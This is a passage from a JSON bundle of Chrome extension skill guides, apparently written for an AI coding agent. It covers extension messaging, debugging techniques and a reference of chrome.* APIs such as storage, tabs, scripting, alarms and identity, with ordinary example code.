{ ...state, ...updates };\n  await chrome.storage.local.set({ state: newState });\n}\n\n// Any component - listen for changes\nchrome.storage.onChanged.addListener((changes, areaName) => {\n  if (areaName === 'local' && changes.state) {\n    const newState = changes.state.newValue;\n    updateUI(newState);\n  }\n});\n```\n\n### Centralized State in Background\n\n```javascript\n// background.js\nlet appState = {\n  user: null,\n  data: [],\n  settings: {}\n};\n\nchrome.runtime.onMessage.addListener((message, sender, sendResponse) => {\n  switch (message.type) {\n    case 'GET_STATE':\n      sendResponse({ state: appState });\n      break;\n\n    case 'UPDATE_STATE':\n      appState = { ...appState, ...message.updates };\n      // Notify all listeners\n      broadcastStateUpdate(appState);\n      sendResponse({ success: true, state: appState });\n      break;\n\n    case 'SUBSCRIBE':\n      // Add to subscribers list\n      break;\n  }\n  return true;\n});\n\nfunction broadcastStateUpdate(state) {\n  chrome.runtime.sendMessage({\n    type: 'STATE_CHANGED',\n    state\n  }).catch(() => {});\n}\n```\n\n---\n\n## Error Handling\n\n### Common Errors\n\n**\"Receiving end does not exist\"**\n```javascript\nasync function safeSendToTab(tabId, message) {\n  try {\n    return await chrome.tabs.sendMessage(tabId, message);\n  } catch (error) {\n    if (error.message.includes('Receiving end does not exist')) {\n      // Inject content script first\n      await chrome.scripting.executeScript({\n        target: { tabId },\n        files: ['content.js']\n      });\n      // Retry\n      return await chrome.tabs.sendMessage(tabId, message);\n    }\n    throw error;\n  }\n}\n```\n\n**\"Extension context invalidated\"**\n```javascript\n// content.js\nfunction isContextValid() {\n  try {\n    chrome.runtime.id;\n    return true;\n  } catch {\n    return false;\n  }\n}\n\nasync function safeSendMessage(message) {\n  if (!isContextValid()) {\n    console.warn('Extension context invalidated - reload page');\n    return null;\n  }\n  return chrome.runtime.sendMessage(message);\n}\n```\n\n**\"Could not establish connection\"**\n```javascript\n// With retry logic\nasync function sendWithRetry(message, maxRetries = 3) {\n  for (let i = 0; i < maxRetries; i++) {\n    try {\n      return await chrome.runtime.sendMessage(message);\n    } catch (error) {\n      if (i === maxRetries - 1) throw error;\n      await new Promise(r => setTimeout(r, 100 * (i + 1)));\n    }\n  }\n}\n```\n\n---\n\n## Message Protocol Design\n\n### Structured Message Format\n\n```typescript\ninterface Message {\n  type: string;\n  payload?: any;\n  requestId?: string;  // For request/response tracking\n  timestamp?: number;\n}\n\ninterface Response {\n  success: boolean;\n  data?: any;\n  error?: string;\n  requestId?: string;\n}\n```\n\n### Type-Safe Messaging\n\n```javascript\n// messages.js - Shared message types\nconst MessageTypes = {\n  // Content → Background\n  SAVE_SELECTION: 'SAVE_SELECTION',\n  GET_PAGE_DATA: 'GET_PAGE_DATA',\n\n  // Background → Content\n  HIGHLIGHT_TEXT: 'HIGHLIGHT_TEXT',\n  UPDATE_CONFIG: 'UPDATE_CONFIG',\n\n  // Background → UI (Popup/SidePanel)\n  DATA_UPDATED: 'DATA_UPDATED',\n  STATUS_CHANGED: 'STATUS_CHANGED'\n};\n\n// Create message helper\nfunction createMessage(type, payload = null) {\n  return {\n    type,\n    payload,\n    requestId: crypto.randomUUID(),\n    timestamp: Date.now()\n  };\n}\n```\n\n---\n\n## External Messaging\n\n### From Web Pages\n\n**manifest.json:**\n```json\n{\n  \"externally_connectable\": {\n    \"matches\": [\"https://mywebsite.com/*\"]\n  }\n}\n```\n\n**Web page:**\n```javascript\n// On https://mywebsite.com\nchrome.runtime.sendMessage(\n  'extension-id-here',\n  { type: 'FROM_WEBSITE', data: 'hello' },\n  (response) => {\n    console.log('Extension responded:', response);\n  }\n);\n```\n\n**Background listener:**\n```javascript\nchrome.runtime.onMessageExternal.addListener(\n  (message, sender, sendResponse) => {\n    // Verify sender\n    if (!sender.url.startsWith('https://mywebsite.com')) {\n      sendResponse({ error: 'Unauthorized' });\n      return;\n    }\n\n    handleExternalMessage(message)\n      .then(sendResponse);\n    return true;\n  }\n);\n```\n\n### Between Extensions\n\n```javascript\n// Send to another extension\nchrome.runtime.sendMessage(\n  'other-extension-id',\n  { type: 'CROSS_EXT_MESSAGE' },\n  (response) => {}\n);\n\n// Receive from other extensions\nchrome.runtime.onMessageExternal.addListener(\n  (message, sender, sendResponse) => {\n    console.log('From extension:', sender.id);\n  }\n);\n```\n\n---\n\n## Best Practices\n\n1. **Always return true for async responses**\n2. **Validate message sources** - Check `sender.id` and `sender.url`\n3. **Handle disconnections gracefully**\n4. **Use structured message types** - Avoid magic strings\n5. **Implement retry logic** - Network can be flaky\n6. **Clean up ports on disconnect**\n7. **Don't assume listeners exist** - Wrap in try-catch\n8. **Use storage for persistent state** - Messages are ephemeral\n9. **Rate limit messages** - Avoid flooding\n10. **Log message flow in development** - Easier debugging"
              },
              {
                "name": "debugging-guide",
                "description": "Comprehensive debugging guide for Chrome Extensions covering DevTools usage, service worker inspection, content script debugging, storage inspection, network analysis, performance profiling, and common error solutions. Use when troubleshooting extension issues.",
                "path": "chrome-extension-expert/skills/debugging-guide/SKILL.md",
                "frontmatter": {
                  "name": "debugging-guide",
                  "description": "Comprehensive debugging guide for Chrome Extensions covering DevTools usage, service worker inspection, content script debugging, storage inspection, network analysis, performance profiling, and common error solutions. Use when troubleshooting extension issues."
                },
                "content": "# Chrome Extension Debugging Guide\n\n## Accessing DevTools\n\n### Extension Management Page\n1. Go to `chrome://extensions`\n2. Enable **Developer mode** (top right toggle)\n3. Click **Details** on your extension\n4. Available debugging entry points:\n   - **Service Worker** link → Service worker DevTools\n   - **Errors** button → View runtime errors\n\n### Different Context DevTools\n\n| Component | How to Access |\n|-----------|---------------|\n| Service Worker | `chrome://extensions` → Click \"Service Worker\" link |\n| Popup | Right-click popup → \"Inspect\" |\n| Side Panel | Right-click side panel → \"Inspect\" |\n| Options Page | Right-click page → \"Inspect\" |\n| Content Script | Page DevTools → Console → Select extension context |\n\n---\n\n## Service Worker Debugging\n\n### Opening Service Worker DevTools\n\n1. Go to `chrome://extensions`\n2. Find your extension\n3. Click the \"Service Worker\" link (shows as \"Inactive\" or \"Active\")\n\n### Service Worker Lifecycle\n\n```javascript\n// Add lifecycle logging\nself.addEventListener('install', (event) => {\n  console.log('[SW] Installing...');\n});\n\nself.addEventListener('activate', (event) => {\n  console.log('[SW] Activated');\n});\n\n// Log when service worker starts\nconsole.log('[SW] Service worker loaded at', new Date().toISOString());\n\n// Monitor fetch events\nself.addEventListener('fetch', (event) => {\n  console.log('[SW] Fetch:', event.request.url);\n});\n```\n\n### Common Service Worker Issues\n\n**Issue: Service Worker Not Loading**\n```javascript\n// Check manifest.json\n{\n  \"background\": {\n    \"service_worker\": \"background.js\",  // Verify path\n    \"type\": \"module\"  // Add if using ES imports\n  }\n}\n\n// Check for syntax errors\n// Open chrome://extensions and look for error badge\n```\n\n**Issue: Service Worker Terminating Early**\n```javascript\n// Keep alive with alarms (not recommended for all cases)\nchrome.alarms.create('keepAlive', { periodInMinutes: 1 });\n\n// Better: Design for termination\n// - Store state in chrome.storage\n// - Re-register listeners at top level\n// - Don't rely on global variables\n```\n\n**Issue: Events Not Firing**\n```javascript\n// WRONG - Listener added async\nsetTimeout(() => {\n  chrome.runtime.onMessage.addListener(handler);\n}, 1000);\n\n// CORRECT - Top-level registration\nchrome.runtime.onMessage.addListener((message, sender, sendResponse) => {\n  // Handle asynchronously inside\n  handleAsync(message).then(sendResponse);\n  return true;\n});\n```\n\n---\n\n## Content Script Debugging\n\n### Finding Content Script Console\n\n1. Open DevTools on the web page (F12)\n2. Click the **Console** tab\n3. Click the dropdown next to \"top\" (usually says \"top\")\n4. Select your extension's context\n\n### Content Script Debugging Tips\n\n```javascript\n// Verify injection\nconsole.log('[Content] Script loaded on:', window.location.href);\nconsole.log('[Content] Document state:', document.readyState);\n\n// Check for multiple injections\nif (window.__myExtensionLoaded) {\n  console.warn('[Content] Already loaded!');\n} else {\n  window.__myExtensionLoaded = true;\n  // Initialize\n}\n\n// Debug DOM queries\nconst element = document.querySelector('#target');\nconsole.log('[Content] Target element:', element);\nif (!element) {\n  console.log('[Content] Available elements:', document.body.innerHTML.slice(0, 500));\n}\n```\n\n### Content Script Injection Failures\n\n```javascript\n// Check manifest matches\n{\n  \"content_scripts\": [{\n    \"matches\": [\"*://*.example.com/*\"],  // Check pattern\n    \"js\": [\"content.js\"],\n    \"run_at\": \"document_idle\"\n  }]\n}\n\n// Verify URL matches pattern\n// chrome://extensions - Content scripts won't run on chrome:// URLs\n\n// Programmatic injection alternative\nchrome.scripting.executeScript({\n  target: { tabId },\n  files: ['content.js']\n}).catch(error => {\n  console.error('Injection failed:', error);\n  // Common errors:\n  // - \"Cannot access chrome:// URLs\"\n  // - \"Missing host_permissions\"\n});\n```\n\n---\n\n## Message Passing Debugging\n\n### Logging All Messages\n\n```javascript\n// background.js\nchrome.runtime.onMessage.addListener((message, sender, sendResponse) => {\n  console.log('[BG] Message received:', {\n    message,\n    from: sender.tab ? `Tab ${sender.tab.id}` : 'Extension',\n    url: sender.url,\n    frameId: sender.frameId\n  });\n\n  // Your handling logic\n  return true;\n});\n\n// content.js\nconst originalSendMessage = chrome.runtime.sendMessage;\nchrome.runtime.sendMessage = function(message, ...args) {\n  console.log('[CS] Sending message:', message);\n  return originalSendMessage.call(this, message, ...args);\n};\n```\n\n### Common Message Errors\n\n**\"Receiving end does not exist\"**\n```javascript\n// The target doesn't have a listener\n// Solutions:\n// 1. Content script not injected\n// 2. Tab navigated away\n// 3. Extension context invalidated\n\nasync function safeSend(tabId, message) {\n  try {\n    return await chrome.tabs.sendMessage(tabId, message);\n  } catch (error) {\n    if (error.message.includes('Receiving end does not exist')) {\n      // Inject content script first\n      await chrome.scripting.executeScript({\n        target: { tabId },\n        files: ['content.js']\n      });\n      return await chrome.tabs.sendMessage(tabId, message);\n    }\n    throw error;\n  }\n}\n```\n\n**Async Response Not Working**\n```javascript\n// WRONG - Missing return true\nchrome.runtime.onMessage.addListener((message, sender, sendResponse) => {\n  fetchData().then(sendResponse);\n  // Missing return true!\n});\n\n// CORRECT\nchrome.runtime.onMessage.addListener((message, sender, sendResponse) => {\n  fetchData().then(sendResponse);\n  return true;  // CRITICAL for async\n});\n```\n\n---\n\n## Storage Debugging\n\n### Inspecting Storage\n\n```javascript\n// Dump all storage contents\nasync function debugStorage() {\n  const local = await chrome.storage.local.get(null);\n  const sync = await chrome.storage.sync.get(null);\n  const session = await chrome.storage.session.get(null);\n\n  console.group('Storage Contents');\n  console.log('Local:', local);\n  console.log('Sync:', sync);\n  console.log('Session:', session);\n  console.groupEnd();\n\n  // Check quotas\n  const localBytes = await chrome.storage.local.getBytesInUse(null);\n  const syncBytes = await chrome.storage.sync.getBytesInUse(null);\n\n  console.group('Storage Usage');\n  console.log(`Local: ${localBytes} / 10,485,760 bytes`);\n  console.log(`Sync: ${syncBytes} / 102,400 bytes`);\n  console.groupEnd();\n}\n\n// Call from DevTools console\ndebugStorage();\n```\n\n### Storage Change Monitoring\n\n```javascript\n// Add to background.js for debugging\nchrome.storage.onChanged.addListener((changes, areaName) => {\n  console.group(`Storage changed [${areaName}]`);\n  for (const [key, { oldValue, newValue }] of Object.entries(changes)) {\n    console.log(`${key}:`, oldValue, '→', newValue);\n  }\n  console.groupEnd();\n});\n```\n\n### Application Panel\n\n1. Open DevTools\n2. Go to **Application** tab\n3. Expand **Storage** → **Extension storage**\n4. View local/sync/session storage contents\n\n---\n\n## Network Debugging\n\n### Network Panel\n\n1. Open DevTools on the relevant context\n2. Go to **Network** tab\n3. Filter by extension requests\n\n### Logging Network Requests\n\n```javascript\n// Wrap fetch for debugging\nconst originalFetch = fetch;\nwindow.fetch = async function(...args) {\n  console.log('[Fetch]', args[0], args[1]);\n  try {\n    const response = await originalFetch.apply(this, args);\n    console.log('[Fetch Response]', response.status, response.url);\n    return response;\n  } catch (error) {\n    console.error('[Fetch Error]', error);\n    throw error;\n  }\n};\n```\n\n### declarativeNetRequest Debugging\n\n```javascript\n// Enable rule matching display\nchrome.declarativeNetRequest.setExtensionActionOptions({\n  displayActionCountAsBadgeText: true\n});\n\n// Get matched rules for a tab\nconst rules = await chrome.declarativeNetRequest.getMatchedRules({\n  tabId: tab.id\n});\nconsole.log('Matched rules:', rules);\n\n// Test a URL against rules\nconst result = await chrome.declarativeNetRequest.testMatchOutcome({\n  url: 'https://example.com/script.js',\n  type: 'script',\n  initiator: 'https://example.com'\n});\nconsole.log('Would match:', result);\n```\n\n---\n\n## Performance Debugging\n\n### Performance Timing\n\n```javascript\n// Measure operation time\nconsole.time('operation');\nawait someOperation();\nconsole.timeEnd('operation');\n\n// Performance marks\nperformance.mark('start');\nawait someOperation();\nperformance.mark('end');\nperformance.measure('operation', 'start', 'end');\nconsole.log(performance.getEntriesByName('operation'));\n```\n\n### Memory Profiling\n\n1. Open DevTools for component\n2. Go to **Memory** tab\n3. Take heap snapshot\n4. Compare snapshots to find leaks\n\n```javascript\n// Force garbage collection (DevTools must be open)\n// Click the trash can icon or use:\n// Settings → Experiments → Enable \"Timeline: show runtime call stats\"\n```\n\n### Performance Panel\n\n1. Open DevTools\n2. Go to **Performance** tab\n3. Click Record\n4. Perform actions\n5. Stop recording\n6. Analyze flame chart\n\n---\n\n## Common Errors & Solutions\n\n### \"Extension context invalidated\"\n\n**Cause:** Extension was reloaded/updated while script was running\n\n**Solution:**\n```javascript\n// Check before Chrome API calls\nfunction isContextValid() {\n  try {\n    chrome.runtime.id;\n    return true;\n  } catch {\n    return false;\n  }\n}\n\n// Notify user\nif (!isContextValid()) {\n  showNotification('Extension updated. Please refresh the page.');\n}\n```\n\n### \"Cannot read properties of undefined\"\n\n**Cause:** API doesn't exist or lacks permission\n\n```javascript\n// Safe API access\nif (chrome.sidePanel) {\n  chrome.sidePanel.open({ tabId });\n} else {\n  console.warn('sidePanel API not available');\n}\n\n// Check manifest permissions\nconsole.log('Permissions:', chrome.runtime.getManifest().permissions);\n```\n\n### \"Uncaught (in promise)\"\n\n**Cause:** Unhandled promise rejection\n\n```javascript\n// Always add catch\nchrome.storage.local.get('key')\n  .then(handleResult)\n  .catch(handleError);\n\n// Or use try-catch with async/await\ntry {\n  const result = await chrome.storage.local.get('key');\n} catch (error) {\n  console.error('Storage error:', error);\n}\n```\n\n### lastError Handling\n\n```javascript\n// Callback style - check lastError\nchrome.tabs.sendMessage(tabId, message, (response) => {\n  if (chrome.runtime.lastError) {\n    console.error('Error:', chrome.runtime.lastError.message);\n    return;\n  }\n  // Process response\n});\n\n// Promise style - use try-catch\ntry {\n  const response = await chrome.tabs.sendMessage(tabId, message);\n} catch (error) {\n  console.error('Error:', error.message);\n}\n```\n\n---\n\n## Debugging Checklist\n\n### Quick Diagnosis\n- [ ] Check `chrome://extensions` for error badge\n- [ ] Click \"Errors\" to see details\n- [ ] Reload extension after changes\n- [ ] Clear storage and retry\n\n### Service Worker\n- [ ] Service worker link shows \"Active\"\n- [ ] Console shows no errors\n- [ ] Listeners registered at top level\n- [ ] State persisted to storage\n\n### Content Scripts\n- [ ] Correct console context selected\n- [ ] URL matches manifest pattern\n- [ ] Script confirms injection\n- [ ] No CSP violations\n\n### Messages\n- [ ] Sender/receiver both have listeners\n- [ ] `return true` for async responses\n- [ ] Check `chrome.runtime.lastError`\n- [ ] Tab ID is correct\n\n### Storage\n- [ ] Correct storage area used\n- [ ] Within quota limits\n- [ ] Keys spelled correctly\n- [ ] Data serializable (no functions)\n\n---\n\n## Hot Reload Development\n\n```javascript\n// Development helper in background.js\nif (process.env.NODE_ENV === 'development') {\n  // Watch for file changes\n  const ws = new WebSocket('ws://localhost:8080');\n  ws.onmessage = (event) => {\n    if (event.data === 'reload') {\n      chrome.runtime.reload();\n    }\n  };\n\n  // Or simpler: manual reload\n  console.log('Press F5 in chrome://extensions to reload');\n}\n```\n\n### File Watcher Script\n\n```javascript\n// watch.js (Node.js)\nconst WebSocket = require('ws');\nconst chokidar = require('chokidar');\n\nconst wss = new WebSocket.Server({ port: 8080 });\n\nchokidar.watch('./src').on('change', () => {\n  wss.clients.forEach(client => {\n    client.send('reload');\n  });\n});\n```"
              },
              {
                "name": "extension-apis",
                "description": "Chrome Extension APIs reference covering runtime, storage, tabs, scripting, action, alarms, notifications, contextMenus, sidePanel, offscreen, and identity APIs. Use when implementing Chrome extension functionality.",
                "path": "chrome-extension-expert/skills/extension-apis/SKILL.md",
                "frontmatter": {
                  "name": "extension-apis",
                  "description": "Chrome Extension APIs reference covering runtime, storage, tabs, scripting, action, alarms, notifications, contextMenus, sidePanel, offscreen, and identity APIs. Use when implementing Chrome extension functionality."
                },
                "content": "# Chrome Extension APIs Reference\n\n## chrome.runtime\n\n### Lifecycle Events\n\n```javascript\n// Extension installed or updated\nchrome.runtime.onInstalled.addListener((details) => {\n  if (details.reason === 'install') {\n    // First install\n  } else if (details.reason === 'update') {\n    // Updated from details.previousVersion\n  }\n});\n\n// Browser started with extension enabled\nchrome.runtime.onStartup.addListener(() => {\n  // Browser startup\n});\n\n// Extension suspended (MV3)\nchrome.runtime.onSuspend.addListener(() => {\n  // Clean up before suspension\n});\n```\n\n### Messaging\n\n```javascript\n// Send message to background\nconst response = await chrome.runtime.sendMessage({\n  type: 'ACTION',\n  data: payload\n});\n\n// Listen for messages\nchrome.runtime.onMessage.addListener((message, sender, sendResponse) => {\n  console.log('From:', sender.tab?.id || 'extension');\n\n  // Async response - MUST return true\n  handleAsync(message).then(sendResponse);\n  return true;\n});\n\n// Connect for long-lived connection\nconst port = chrome.runtime.connect({ name: 'channel' });\nport.postMessage({ type: 'HELLO' });\nport.onMessage.addListener((message) => {\n  console.log('Received:', message);\n});\nport.onDisconnect.addListener(() => {\n  console.log('Port disconnected');\n});\n```\n\n### Extension Info\n\n```javascript\n// Get extension info\nconst manifest = chrome.runtime.getManifest();\nconst id = chrome.runtime.id;\nconst url = chrome.runtime.getURL('page.html');\n\n// Reload extension\nchrome.runtime.reload();\n\n// Open options page\nchrome.runtime.openOptionsPage();\n```\n\n---\n\n## chrome.storage\n\n### Storage Areas\n\n```javascript\n// Local storage (10MB limit, persistent)\nawait chrome.storage.local.set({ key: 'value' });\nconst { key } = await chrome.storage.local.get('key');\nconst all = await chrome.storage.local.get(null);\nawait chrome.storage.local.remove('key');\nawait chrome.storage.local.clear();\n\n// Sync storage (100KB limit, synced across devices)\nawait chrome.storage.sync.set({ settings: { theme: 'dark' } });\nconst { settings } = await chrome.storage.sync.get('settings');\n\n// Session storage (cleared on browser restart)\nawait chrome.storage.session.set({ tempData: data });\nconst { tempData } = await chrome.storage.session.get('tempData');\n\n// Check usage\nconst bytes = await chrome.storage.local.getBytesInUse(null);\nconst syncBytes = await chrome.storage.sync.getBytesInUse(null);\n```\n\n### Storage Limits\n\n| Area | Total Limit | Per Item |\n|------|-------------|----------|\n| local | 10 MB | Unlimited |\n| sync | 102,400 bytes | 8,192 bytes |\n| session | 10 MB | Unlimited |\n\n### Change Listener\n\n```javascript\nchrome.storage.onChanged.addListener((changes, areaName) => {\n  for (const [key, { oldValue, newValue }] of Object.entries(changes)) {\n    console.log(`${areaName}.${key}: ${oldValue} → ${newValue}`);\n  }\n});\n```\n\n---\n\n## chrome.tabs\n\n### Query Tabs\n\n```javascript\n// Get current tab\nconst [tab] = await chrome.tabs.query({\n  active: true,\n  currentWindow: true\n});\n\n// Get all tabs\nconst tabs = await chrome.tabs.query({});\n\n// Query with filters\nconst tabs = await chrome.tabs.query({\n  url: '*://*.example.com/*',\n  status: 'complete',\n  pinned: false\n});\n```\n\n### Tab Operations\n\n```javascript\n// Create new tab\nconst tab = await chrome.tabs.create({\n  url: 'https://example.com',\n  active: true,\n  index: 0\n});\n\n// Update tab\nawait chrome.tabs.update(tabId, {\n  url: 'https://new-url.com',\n  active: true,\n  pinned: true\n});\n\n// Remove tab\nawait chrome.tabs.remove(tabId);\nawait chrome.tabs.remove([tabId1, tabId2]);\n\n// Reload tab\nawait chrome.tabs.reload(tabId);\n\n// Duplicate tab\nconst newTab = await chrome.tabs.duplicate(tabId);\n\n// Move tab\nawait chrome.tabs.move(tabId, { index: 0 });\n\n// Get tab\nconst tab = await chrome.tabs.get(tabId);\n```\n\n### Tab Messaging\n\n```javascript\n// Send message to content script in tab\ntry {\n  const response = await chrome.tabs.sendMessage(tabId, {\n    type: 'GET_DATA'\n  });\n} catch (error) {\n  // Content script not loaded\n}\n\n// Send to specific frame\nawait chrome.tabs.sendMessage(tabId, message, { frameId: 0 });\n```\n\n### Tab Events\n\n```javascript\nchrome.tabs.onCreated.addListener((tab) => {});\nchrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {\n  if (changeInfo.status === 'complete') {\n    // Page loaded\n  }\n});\nchrome.tabs.onRemoved.addListener((tabId, removeInfo) => {});\nchrome.tabs.onActivated.addListener(({ tabId, windowId }) => {});\n```\n\n---\n\n## chrome.scripting\n\n### Execute Script\n\n```javascript\n// Execute function in tab\nconst results = await chrome.scripting.executeScript({\n  target: { tabId },\n  func: () => document.title\n});\nconsole.log(results[0].result);\n\n// Execute with arguments\nawait chrome.scripting.executeScript({\n  target: { tabId },\n  func: (arg1, arg2) => {\n    console.log(arg1, arg2);\n  },\n  args: ['hello', 'world']\n});\n\n// Execute file\nawait chrome.scripting.executeScript({\n  target: { tabId },\n  files: ['content.js']\n});\n\n// Execute in specific frames\nawait chrome.scripting.executeScript({\n  target: { tabId, frameIds: [0] },\n  files: ['content.js']\n});\n\n// Execute in all frames\nawait chrome.scripting.executeScript({\n  target: { tabId, allFrames: true },\n  files: ['content.js']\n});\n\n// Execute in main world (access page variables)\nawait chrome.scripting.executeScript({\n  target: { tabId },\n  world: 'MAIN',\n  func: () => window.somePageVariable\n});\n```\n\n### Insert CSS\n\n```javascript\n// Insert CSS string\nawait chrome.scripting.insertCSS({\n  target: { tabId },\n  css: 'body { background: red !important; }'\n});\n\n// Insert CSS file\nawait chrome.scripting.insertCSS({\n  target: { tabId },\n  files: ['styles.css']\n});\n\n// Remove CSS\nawait chrome.scripting.removeCSS({\n  target: { tabId },\n  css: 'body { background: red !important; }'\n});\n```\n\n### Register Content Scripts\n\n```javascript\n// Register dynamic content script\nawait chrome.scripting.registerContentScripts([{\n  id: 'my-script',\n  matches: ['*://*.example.com/*'],\n  js: ['content.js'],\n  runAt: 'document_idle'\n}]);\n\n// Update registered script\nawait chrome.scripting.updateContentScripts([{\n  id: 'my-script',\n  matches: ['*://*.new-domain.com/*']\n}]);\n\n// Unregister\nawait chrome.scripting.unregisterContentScripts({\n  ids: ['my-script']\n});\n\n// Get registered scripts\nconst scripts = await chrome.scripting.getRegisteredContentScripts();\n```\n\n---\n\n## chrome.action\n\n```javascript\n// Set popup\nchrome.action.setPopup({ popup: 'popup.html' });\nchrome.action.setPopup({ tabId, popup: 'tab-popup.html' });\n\n// Set icon\nchrome.action.setIcon({\n  path: 'icons/active.png'\n});\nchrome.action.setIcon({\n  tabId,\n  path: { 16: 'icon16.png', 32: 'icon32.png' }\n});\n\n// Set badge\nchrome.action.setBadgeText({ text: '5' });\nchrome.action.setBadgeText({ tabId, text: '!' });\nchrome.action.setBadgeBackgroundColor({ color: '#FF0000' });\nchrome.action.setBadgeTextColor({ color: '#FFFFFF' });\n\n// Set title (tooltip)\nchrome.action.setTitle({ title: 'Custom tooltip' });\n\n// Enable/disable\nchrome.action.enable(tabId);\nchrome.action.disable(tabId);\n\n// Click handler (when no popup)\nchrome.action.onClicked.addListener((tab) => {\n  // Handle click\n});\n\n// Open popup programmatically (Chrome 127+)\nawait chrome.action.openPopup();\n```\n\n---\n\n## chrome.alarms\n\n```javascript\n// Create alarm\nchrome.alarms.create('myAlarm', {\n  delayInMinutes: 1,           // First trigger\n  periodInMinutes: 5           // Repeat interval\n});\n\nchrome.alarms.create('oneTime', {\n  when: Date.now() + 60000     // Specific time (ms)\n});\n\n// Listen for alarm\nchrome.alarms.onAlarm.addListener((alarm) => {\n  if (alarm.name === 'myAlarm') {\n    // Handle alarm\n  }\n});\n\n// Get alarms\nconst alarm = await chrome.alarms.get('myAlarm');\nconst allAlarms = await chrome.alarms.getAll();\n\n// Clear alarms\nawait chrome.alarms.clear('myAlarm');\nawait chrome.alarms.clearAll();\n```\n\n---\n\n## chrome.notifications\n\n```javascript\n// Create notification\nconst notificationId = await chrome.notifications.create({\n  type: 'basic',\n  iconUrl: 'icon128.png',\n  title: 'Notification Title',\n  message: 'Notification message',\n  priority: 2,\n  buttons: [\n    { title: 'Button 1' },\n    { title: 'Button 2' }\n  ]\n});\n\n// Progress notification\nawait chrome.notifications.create({\n  type: 'progress',\n  iconUrl: 'icon128.png',\n  title: 'Downloading',\n  message: 'Please wait...',\n  progress: 50\n});\n\n// Update notification\nawait chrome.notifications.update(notificationId, {\n  progress: 100,\n  message: 'Complete!'\n});\n\n// Clear notification\nawait chrome.notifications.clear(notificationId);\n\n// Event listeners\nchrome.notifications.onClicked.addListener((notificationId) => {});\nchrome.notifications.onButtonClicked.addListener((notificationId, buttonIndex) => {});\nchrome.notifications.onClosed.addListener((notificationId, byUser) => {});\n```\n\n---\n\n## chrome.contextMenus\n\n```javascript\n// Create context menu\nchrome.contextMenus.create({\n  id: 'myMenu',\n  title: 'Do something with \"%s\"',\n  contexts: ['selection', 'link', 'image'],\n  documentUrlPatterns: ['*://*.example.com/*']\n});\n\n// Nested menu\nchrome.contextMenus.create({\n  id: 'parent',\n  title: 'Parent Menu',\n  contexts: ['all']\n});\nchrome.contextMenus.create({\n  id: 'child',\n  parentId: 'parent',\n  title: 'Child Item',\n  contexts: ['all']\n});\n\n// Handle click\nchrome.contextMenus.onClicked.addListener((info, tab) => {\n  if (info.menuItemId === 'myMenu') {\n    console.log('Selected text:', info.selectionText);\n    console.log('Link URL:', info.linkUrl);\n    console.log('Image URL:', info.srcUrl);\n  }\n});\n\n// Update menu\nchrome.contextMenus.update('myMenu', { title: 'New Title' });\n\n// Remove menu\nchrome.contextMenus.remove('myMenu');\nchrome.contextMenus.removeAll();\n```\n\n### Context Types\n`all`, `page`, `frame`, `selection`, `link`, `editable`, `image`, `video`, `audio`, `launcher`, `browser_action`, `page_action`, `action`\n\n---\n\n## chrome.sidePanel\n\n```javascript\n// Open side panel\nawait chrome.sidePanel.open({ tabId: tab.id });\nawait chrome.sidePanel.open({ windowId: window.id });\n\n// Set panel options\nawait chrome.sidePanel.setOptions({\n  tabId,\n  path: 'sidepanel.html',\n  enabled: true\n});\n\n// Get panel options\nconst options = await chrome.sidePanel.getOptions({ tabId });\n\n// Set panel behavior\nawait chrome.sidePanel.setPanelBehavior({\n  openPanelOnActionClick: true\n});\n```\n\n---\n\n## chrome.offscreen\n\nFor tasks requiring DOM but not visible UI.\n\n```javascript\n// Create offscreen document\nawait chrome.offscreen.createDocument({\n  url: 'offscreen.html',\n  reasons: ['DOM_SCRAPING', 'AUDIO_PLAYBACK'],\n  justification: 'Parse HTML content'\n});\n\n// Check if exists\nconst existing = await chrome.offscreen.hasDocument();\n\n// Close offscreen document\nawait chrome.offscreen.closeDocument();\n```\n\n### Reasons\n`TESTING`, `AUDIO_PLAYBACK`, `IFRAME_SCRIPTING`, `DOM_SCRAPING`, `BLOBS`, `DOM_PARSER`, `USER_MEDIA`, `DISPLAY_MEDIA`, `WEB_RTC`, `CLIPBOARD`, `LOCAL_STORAGE`, `WORKERS`, `BATTERY_STATUS`, `MATCH_MEDIA`, `GEOLOCATION`\n\n---\n\n## chrome.identity\n\n```javascript\n// OAuth2 authentication\nconst token = await chrome.identity.getAuthToken({\n  interactive: true\n});\n\n// Launch web auth flow\nconst responseUrl = await chrome.identity.launchWebAuthFlow({\n  url: 'https://auth.provider.com/oauth?...',\n  interactive: true\n});\n\n// Remove cached token\nawait chrome.identity.removeCachedAuthToken({ token });\n\n// Get profile info\nconst userInfo = await chrome.identity.getProfileUserInfo({\n  accountStatus: 'ANY'\n});\n```\n\n---\n\n## chrome.permissions\n\n```javascript\n// Check permissions\nconst hasPermission = await chrome.permissions.contains({\n  permissions: ['tabs'],\n  origins: ['*://*.example.com/*']\n});\n\n// Request permissions (must be user gesture)\nconst granted = await chrome.permissions.request({\n  permissions: ['history'],\n  origins: ['*://*.new-site.com/*']\n});\n\n// Remove permissions\nawait chrome.permissions.remove({\n  permissions: ['history']\n});\n\n// Get all permissions\nconst all = await chrome.permissions.getAll();\n\n// Listen for changes\nchrome.permissions.onAdded.addListener((permissions) => {});\nchrome.permissions.onRemoved.addListener((permissions) => {});\n```\n\n---\n\n## chrome.declarativeNetRequest\n\n```javascript\n// Update dynamic rules\nawait chrome.declarativeNetRequest.updateDynamicRules({\n  removeRuleIds: [1],\n  addRules: [{\n    id: 2,\n    priority: 1,\n    action: { type: 'block' },\n    condition: {\n      urlFilter: '*://ads.example.com/*',\n      resourceTypes: ['script', 'image']\n    }\n  }]\n});\n\n// Get rules\nconst rules = await chrome.declarativeNetRequest.getDynamicRules();\nconst sessionRules = await chrome.declarativeNetRequest.getSessionRules();\n\n// Test rules\nconst result = await chrome.declarativeNetRequest.testMatchOutcome({\n  url: 'https://ads.example.com/script.js',\n  type: 'script'\n});\n\n// Enable/disable rulesets\nawait chrome.declarativeNetRequest.updateEnabledRulesets({\n  enableRulesetIds: ['ruleset_1'],\n  disableRulesetIds: ['ruleset_2']\n});\n```"
              },
              {
                "name": "manifest-v3",
                "description": "Comprehensive Manifest V3 reference covering manifest.json structure, all fields, service workers, content scripts, permissions, CSP, icons, and side panel configuration. Use when creating or modifying Chrome Extension manifests.",
                "path": "chrome-extension-expert/skills/manifest-v3/SKILL.md",
                "frontmatter": {
                  "name": "manifest-v3",
                  "description": "Comprehensive Manifest V3 reference covering manifest.json structure, all fields, service workers, content scripts, permissions, CSP, icons, and side panel configuration. Use when creating or modifying Chrome Extension manifests."
                },
